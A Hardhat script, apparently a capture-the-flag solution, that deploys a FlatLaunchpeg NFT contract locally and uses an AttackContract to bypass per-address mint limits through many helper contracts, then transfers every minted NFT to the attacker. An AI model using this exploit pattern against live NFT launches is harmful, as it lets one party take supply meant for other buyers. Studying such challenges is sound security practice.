import { ethers } from "hardhat";

async function main() {
/*****************************88 */
   let accounts = await ethers.getSigners();
   let  [attacker, o1, o2, admin] = accounts;
  
    const flatLaunchpegFactory = await ethers.getContractFactory('FlatLaunchpeg')
    const flatLaunchpeg = await flatLaunchpegFactory.connect(admin).deploy(69,5,5)

   await flatLaunchpeg.deployed()

   console.log("flatLaunchpegFactory", flatLaunchpeg.address)
  
   let startBlock = await ethers.provider.getBlockNumber()
   console.log("startblock", startBlock);

/*************************************************88 */

  const AttackContract = await ethers.getContractFactory("AttackContract");
  const attackContract = await AttackContract.connect(attacker).deploy(attacker.address, flatLaunchpeg.address);

  await attackContract.deployed();

  console.log(`attackContract deployed to ${attackContract.address}`);

         /** Interact with the AttackContract contract */
  const contract = await ethers.getContractAt("AttackContract", attackContract.address);


  //total addresses
  const alladdress = await contract.returnAlladdress();
  console.log("alladdress", alladdress);

//check balance of the addr
const flatnft = flatLaunchpegFactory.attach(flatLaunchpeg.address)
let i = 0;

//get balance of each contract address deployed
for(i; i<=13; i++){
  console.log(await flatnft.balanceOf(alladdress[i]));
}


console.log("owner of 0", await flatnft.ownerOf(0))
console.log("owner of 68", await flatnft.ownerOf(68))

console.log("----------------------------------------")
console.log("----------------------------------------" )

 /****************mint nft to the attacker******************** */


  // Initialize the ID counter
  let idCounter = 0;

// Loop through each contract address
for (let i = 0; i < alladdress.length; i++) {
  const contractAddress = alladdress[i];

    // Calculate the number of NFTs to mint in the current contract
    const nftsToMintPerContract = (i === alladdress.length - 1) ? 4 : 5;

  
  // Mint the NFTs in the current contract
  for (let j = 0; j < nftsToMintPerContract; j++) {
    // Mint logic goes here, using the current contract address
    
    // Example minting code:
    console.log(`transfering NFT ${j + 1} in contract ${contractAddress}`);
        // Mint the NFT using the current contract and address
        flatnft.connect(attacker).transferFrom(contractAddress, attacker.address, idCounter)
        console.log("owner of " + idCounter, await flatnft.ownerOf(idCounter))
    
        idCounter++;
  }
  
  // Check if there is another contract address available
  if (i + 1 < alladdress.length) {
    console.log(`Switching to contract ${alladdress[i + 1]}\n`);
  }


}







/***************check balance of the attacker******************8 */
console.log("balance of attacker",await flatnft.balanceOf(attacker.address))




}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});